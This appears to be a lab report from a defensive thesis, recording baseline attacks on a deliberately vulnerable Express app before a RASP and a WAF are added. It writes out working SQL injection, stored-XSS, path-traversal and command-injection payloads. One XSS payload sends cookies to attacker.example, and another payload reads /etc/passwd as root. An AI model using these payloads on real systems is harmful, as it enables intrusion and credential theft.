# Config. 1 — Baseline Evaluation (No Protection)

**Status:** Executed 2026-07-24. Evidence captured directly against a live instance — no results below are hypothetical.

> **Open item on the task ID:** the ticket for this task references `A20/A26`. `A20` is already assigned in `docs/results.md` to a different, closed task ("A15/A20 — ONNX Inference Module"). This document does not adopt `A20` as its own ID until that collision is resolved — confirm the correct numbering before citing this document by ID elsewhere.

---

## 1. Purpose

This is **Config. 1** of the three-configuration test plan (F4: baseline → +logSguarDian → +WAF). It establishes the effective attack surface of the target application with **zero protection** — no RASP, no WAF, no security middleware of any kind. Every subsequent configuration is measured as a delta against the results in this document, using the identical application, identical payloads, and identical endpoints.

## 2. Target Application

| Field | Value |
|---|---|
| Repository | `logSguarDian-vulnerable-project` (separate repo, sibling to `logSguarDian/`) |
| Commit | `a02a8e9ef382425b304375be832db0cb0fda2d65` (2026-07-23 21:40:07 -0600) |
| Runtime | Node.js 20, Express `^4.18.2` |
| Database | PostgreSQL 15, internal Docker network, not exposed to host |
| Sessions | `express-session` (cookie-based, no JWT) |
| Views | EJS server-side rendering |
| File uploads | `multer`, stored at `/app/uploads` inside the container |
| Deployment | `docker compose up`, no manual steps, seed data loaded automatically |
| Vulnerability reference | `VULNERABILITIES.md` in the target repo — one documented vector per category, plus alternates |

## 3. Methodology

Each of the 4 mandated categories (SQLi, XSS, Path Traversal/LFI, CMDi) was exercised with the exact `curl` proof-of-concept from the target repo's `VULNERABILITIES.md`, run against the live container over `http://localhost:3000`. Raw HTTP responses were captured and inspected directly — no result below is "expected," all are observed.

One correction was found and applied during execution (§4.2).

## 4. Results by Category

### 4.1 SQL Injection — Authentication Bypass

**Endpoint:** `POST /login` · **Payload:** `username=' OR '1'='1' --`, `password=anything`

**Result: COMPROMISED.** `302 Found` redirect to `/posts` with a valid `Set-Cookie: connect.sid=...`, no valid credentials supplied. The resulting session has full admin access — confirmed by loading `/admin` with the obtained cookie and receiving `<h1>Admin Panel</h1>`.

### 4.2 SQL Injection — UNION-Based Data Exfiltration

**Endpoint:** `GET /posts/search?q=` · **Payload:** UNION-based injection against the `users` table.

**Correction to the documented PoC:** the real query is `SELECT p.*, u.username FROM posts p JOIN users u ON p.user_id = u.id WHERE ...` — the `JOIN` adds `u.username` as an **8th** column on top of the 7 columns of `posts`. The PoC in `VULNERABILITIES.md` supplies only 7 values in its `UNION SELECT`, which Postgres rejects (`each UNION query must have the same number of columns`), producing an `HTTP 500` rather than the documented result. Confirmed independently: a bare `q='` also returns `500`, proving the endpoint is genuinely unescaped/concatenated — the vulnerability is real, only the column count in the example PoC was wrong. Working payload (8 columns):

```
q=nomatch' UNION SELECT 1, u.id, u.password, u.username, NULL, NOW(), NOW(), u.username FROM users u --
```

**Result: COMPROMISED.** Full plaintext credential dump exfiltrated through the post list rendering:

| Username | Password (plaintext) |
|---|---|
| admin | `admin123` |
| alice | `alice123` |
| bob | `bob123` |
| xtsebas | *(4th seed user, not listed in the target repo's README — password value returned as `xtsebas`)* |

This should be reported back to whoever maintains the target app's `VULNERABILITIES.md`, since the documented PoC as written does not work.

### 4.3 Stored XSS — Bio Field

**Store:** `POST /profile`, `bio=<script>document.write("<img src=x onerror=alert(document.cookie)>")</script>` (as `alice`) · **Trigger:** `GET /users/2` (as `bob`)

**Result: COMPROMISED.** The `<script>` tag is present verbatim, unescaped, in the HTML served to a second, unrelated user (`bob`). Confirmed via EJS's `<%- %>` (raw output) on the `bio` field in `views/profile.ejs`.

### 4.4 Stored XSS — Post Content

**Store:** `POST /posts` (multipart form) with `content=<script>fetch("http://attacker.example/steal?c="+document.cookie)</script>` (as `alice`) · **Trigger:** `GET /posts/45` (as `bob`)

**Curl gotcha found during execution:** `-F 'content=<script>...'` fails silently / returns `HTTP 000` — curl's `-F` treats a value starting with `<` as "read this field's value from a local file," not as literal text. `--form-string` avoids this. Also: the response to `POST /posts` redirects to `/posts` (the listing), not to the new post — the new post's ID has to be read off the listing page, not the `Location` header as `VULNERABILITIES.md` suggests.

**Result: COMPROMISED.** The `<script>` tag renders verbatim in `bob`'s view of the post.

### 4.5 Path Traversal / LFI

**Endpoint:** `GET /posts/:id/attachment?file=../../../etc/passwd`

**Result: COMPROMISED.** Real contents of `/etc/passwd` from inside the container returned with `HTTP 200`.

### 4.6 Command Injection

**Endpoint:** `POST /admin/ping`, `host=127.0.0.1 ; whoami ; cat /etc/passwd | head -3` (as `admin`)

**Result: COMPROMISED — and worse than a generic RCE.** `whoami` returned `root`. The Node process inside the container runs as root, so command injection here is not "arbitrary command as a limited service account" — it's unrestricted root access to the container. Chained commands (`ping` output followed by `whoami` followed by `/etc/passwd` contents) all executed and were returned in the response body.

## 5. Summary — Effective Attack Surface

| Category | Vector(s) tested | Result | Severity |
|---|---|---|---|
| SQL Injection | Auth bypass, UNION exfiltration | **2/2 compromised** | Critical — full auth bypass + plaintext credential dump |
| XSS (stored) | Bio field, post content | **2/2 compromised** | High — arbitrary JS execution in another user's session |
| Path Traversal / LFI | Attachment download | **1/1 compromised** | High — arbitrary file read from container filesystem |
| Command Injection | Admin ping utility | **1/1 compromised** | Critical — unrestricted root command execution |

**6/6 tested vectors succeeded.** This is the expected outcome for a baseline with zero protection — it establishes the floor that Config 2 (+logSguarDian) and Config 3 (+WAF) are measured against. Every vector above should be re-run, unmodified, against Config 2 and Config 3, with the same evidence-capture discipline (real responses, not assumptions).

## 6. Notes for Config 2 / Config 3

- Re-run every payload in §4 exactly as written here (including the corrected 8-column UNION payload and the `--form-string` curl fix) — changing the payloads between configs would invalidate the comparison.
- The target app exposes a plain `express()` instance at `src/app.js` in the target repo; mounting `app.use(logsguardian(config))` there is the only change needed for Config 2, per that repo's `README.md`.
- Command injection ran as root in Config 1 — if Config 2 blocks it, worth explicitly noting in the writeup that the baseline severity was "full root RCE," not a generic finding, since that's a stronger comparison point for the thesis.
